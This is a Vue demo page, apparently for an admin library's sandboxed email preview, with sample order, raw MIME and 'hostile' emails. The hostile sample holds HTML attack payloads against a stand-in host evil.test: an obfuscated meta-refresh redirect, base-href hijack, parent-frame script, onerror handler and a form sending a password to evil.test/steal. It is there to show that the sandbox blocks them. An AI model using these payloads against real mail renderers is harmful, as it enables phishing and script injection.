<script setup>
/**
 * EmailPlayground — captured emails, rendered safely (#4113).
 */
import { ref } from 'vue'
import { usePageTitle, EmailPreview } from '@quazardous/qdadm'
import { parseMime } from '@quazardous/qdadm/email'
import Card from 'primevue/card'
import SelectButton from 'primevue/selectbutton'

usePageTitle('Emails')

// A 16×16 logo, sent inline and referenced as cid:logo@shop.test
const LOGO = 'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAANElEQVR4nGP4TyJgQOaoJr/GirBrwKUaTQ8DMaqR9TAQqRquZ1QDzTSQHHHkJA1yEh+RAAC5G/RYhLV2MAAAAABJRU5ErkJggg=='
const PDF = btoa('%PDF-1.4\n% a tiny invoice\n')

const order = {
  from: { name: 'Shop', address: 'orders@shop.test' },
  to: [{ name: 'Ana Lima', address: 'ana@example.test' }],
  replyTo: ['support@shop.test'],
  subject: 'Your order #48211 is confirmed',
  date: new Date(Date.now() - 3600_000).toISOString(),
  headers: [
    { key: 'Message-ID', value: '<48211.1760860000@shop.test>' },
    { key: 'X-Mailer', value: 'shop-mailer 3.2' },
    { key: 'List-Unsubscribe', value: '<https://shop.test/unsubscribe?u=ana>' },
  ],
  html: `<div style="font-family:Georgia,serif;max-width:520px">
    <img src="cid:logo@shop.test" width="32" height="32" alt="Shop">
    <h2 style="color:#2563eb">Thank you, Ana!</h2>
    <p>Your order <b>#48211</b> is confirmed and will ship from Lyon.</p>
    <table style="border-collapse:collapse;width:100%">
      <tr><td style="padding:4px;border-bottom:1px solid #ddd">Mug, blue &amp; white × 2</td><td style="text-align:right">19.80 €</td></tr>
      <tr><td style="padding:4px;border-bottom:1px solid #ddd">Tea towel × 1</td><td style="text-align:right">4.50 €</td></tr>
    </table>
    <p><img src="https://picsum.photos/seed/qdadm/480/120" alt="This week's picks" width="480" height="120"></p>
    <p><a href="https://shop.test/orders/48211">Follow your order</a></p>
    <img src="https://track.shop.test/open.gif?u=ana" width="1" height="1" alt="">
  </div>`,
  text: 'Thank you, Ana!\n\nYour order #48211 is confirmed and will ship from Lyon.\n\n- Mug, blue & white x 2   19.80 EUR\n- Tea towel x 1           4.50 EUR\n\nFollow your order: https://shop.test/orders/48211',
  attachments: [
    { filename: 'logo.png', contentType: 'image/png', content: LOGO, contentId: '<logo@shop.test>', disposition: 'inline' },
    { filename: 'invoice-48211.pdf', contentType: 'application/pdf', content: PDF, disposition: 'attachment' },
  ],
}

const hostile = {
  from: 'someone@evil.test',
  to: ['ana@example.test'],
  subject: 'Everything an email should not be able to do',
  date: new Date().toISOString(),
  html: `<meta http-equiv="&#x72;efresh" content="2;url=https://evil.test/">
    <link rel="dns-prefetch" href="//evil.test"><base href="https://evil.test/">
    <script>parent.document.title = 'PWNED'; document.body.innerHTML = 'script ran'<\/script>
    <p id="msg">Scripts, the refresh and the prefetch were stopped: this text is still here.</p>
    <form action="https://evil.test/steal"><input name="password" placeholder="password"><button>Send</button></form>
    <img src="https://evil.test/pixel.gif" onerror="parent.document.title='PWNED'" alt="">
    <iframe src="https://evil.test/frame"></iframe>`,
}

const eml = [
  'From: "Supplier ACME" <orders@acme.test>',
  'To: shop@shop.test',
  'Subject: =?UTF-8?Q?Bon_de_commande_PO-77812_re=C3=A7u?=',
  `Date: ${new Date().toUTCString()}`,
  'Message-ID: <po-77812@acme.test>',
  'MIME-Version: 1.0',
  'Content-Type: multipart/mixed; boundary="mix"',
  '',
  '--mix',
  'Content-Type: multipart/alternative; boundary="alt"',
  '',
  '--alt',
  'Content-Type: text/plain; charset=utf-8',
  'Content-Transfer-Encoding: quoted-printable',
  '',
  'Bonjour,=0A=0ANous avons bien re=C3=A7u le bon de commande PO-77812.',
  '--alt',
  'Content-Type: text/html; charset=utf-8',
  '',
  '<p>Bonjour,</p><p>Nous avons bien reçu le bon de commande <b>PO-77812</b>.</p>',
  '--alt--',
  '--mix',
  'Content-Type: text/csv; name="po-77812.csv"',
  'Content-Disposition: attachment; filename="po-77812.csv"',
  'Content-Transfer-Encoding: base64',
  '',
  btoa('sku;qty\nSKU-778;2\nSKU-102;1\n'),
  '--mix--',
  '',
].join('\r\n')

const samples = [
  { label: 'Order confirmation', value: 'order' },
  { label: 'Raw .eml', value: 'eml' },
  { label: 'Hostile email', value: 'hostile' },
]
const sample = ref('order')
</script>

<template>
  <div class="email-playground">
    <Card>
      <template #title>A captured email</template>
      <template #content>
        <p class="hint">
          The HTML renders in a sandboxed frame: no scripts, nothing remote. Remote images wait for “Load images”;
          the logo is an inline attachment, so it shows.
        </p>
        <SelectButton v-model="sample" :options="samples" option-label="label" option-value="value" :allow-empty="false" class="pick" />
        <EmailPreview v-if="sample === 'order'" :email="order" height="26rem" />
        <EmailPreview v-else-if="sample === 'eml'" :raw="eml" :parser="parseMime" height="12rem" />
        <EmailPreview v-else :email="hostile" height="16rem" />
      </template>
    </Card>
  </div>
</template>

<style scoped>
.email-playground {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

.hint {
  margin: 0 0 0.75rem;
  color: var(--p-text-muted-color);
}

.pick {
  margin-bottom: 0.75rem;
  flex-wrap: wrap;
}
</style>
